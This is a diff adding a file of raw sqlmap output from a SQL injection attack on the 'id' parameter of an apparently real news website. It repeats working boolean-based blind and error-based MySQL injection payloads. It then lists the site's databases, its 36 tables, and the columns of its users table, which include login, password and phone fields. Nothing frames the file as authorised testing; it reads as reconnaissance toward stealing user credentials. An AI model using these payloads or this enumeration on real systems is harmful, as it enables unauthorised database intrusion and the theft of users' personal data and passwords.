@@ -1,0 +1,137 @@
+sqlmap identified the following injection points with a total of 34 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=320' AND 7917=7917 AND 'PjgK'='PjgK
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=320' AND (SELECT 1150 FROM(SELECT COUNT(*),CONCAT(CHAR(58,99,120,104,58),(SELECT (CASE WHEN (1150=1150) THEN 1 ELSE 0 END)),CHAR(58,110,120,112,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND 'Gaud'='Gaud
+---
+
+available databases [2]:
+[*] hortnewsdb
+[*] information_schema
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=320' AND 7917=7917 AND 'PjgK'='PjgK
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=320' AND (SELECT 1150 FROM(SELECT COUNT(*),CONCAT(CHAR(58,99,120,104,58),(SELECT (CASE WHEN (1150=1150) THEN 1 ELSE 0 END)),CHAR(58,110,120,112,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND 'Gaud'='Gaud
+---
+
+Database: hortnewsdb
+[36 tables]
++------------------------+
+| ads                    |
+| answers                |
+| artticle_comments      |
+| c_category             |
+| category               |
+| city                   |
+| countries              |
+| country                |
+| countrylanguage        |
+| downloads              |
+| events                 |
+| factory_master         |
+| factory_output         |
+| file                   |
+| gallery                |
+| gallery_photo          |
+| gss_article            |
+| jobs                   |
+| links                  |
+| m_admin                |
+| m_list                 |
+| m_newsletters          |
+| mailusers              |
+| members                |
+| pdfdownload            |
+| photogallery           |
+| photos                 |
+| price_lists            |
+| questions              |
+| stakeholder_categories |
+| stakeholders           |
+| statistics             |
+| tally                  |
+| users                  |
+| video                  |
+| wholocations           |
++------------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=320' AND 7917=7917 AND 'PjgK'='PjgK
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=320' AND (SELECT 1150 FROM(SELECT COUNT(*),CONCAT(CHAR(58,99,120,104,58),(SELECT (CASE WHEN (1150=1150) THEN 1 ELSE 0 END)),CHAR(58,110,120,112,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND 'Gaud'='Gaud
+---
+
+Database: hortnewsdb
+Table: users
+[6 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| firstname | varchar(100) |
+| lastname  | varchar(255) |
+| login     | varchar(255) |
+| member_id | int(11)      |
+| passwd    | varchar(255) |
+| phone     | varchar(255) |
++-----------+--------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=320' AND 7917=7917 AND 'PjgK'='PjgK
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=320' AND (SELECT 1150 FROM(SELECT COUNT(*),CONCAT(CHAR(58,99,120,104,58),(SELECT (CASE WHEN (1150=1150) THEN 1 ELSE 0 END)),CHAR(58,110,120,112,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND 'Gaud'='Gaud
+---
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=320' AND 7917=7917 AND 'PjgK'='PjgK
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=320' AND (SELECT 1150 FROM(SELECT COUNT(*),CONCAT(CHAR(58,99,120,104,58),(SELECT (CASE WHEN (1150=1150) THEN 1 ELSE 0 END)),CHAR(58,110,120,112,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND 'Gaud'='Gaud
+---
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=320' AND 7917=7917 AND 'PjgK'='PjgK
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=320' AND (SELECT 1150 FROM(SELECT COUNT(*),CONCAT(CHAR(58,99,120,104,58),(SELECT (CASE WHEN (1150=1150) THEN 1 ELSE 0 END)),CHAR(58,110,120,112,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND 'Gaud'='Gaud
+---
+
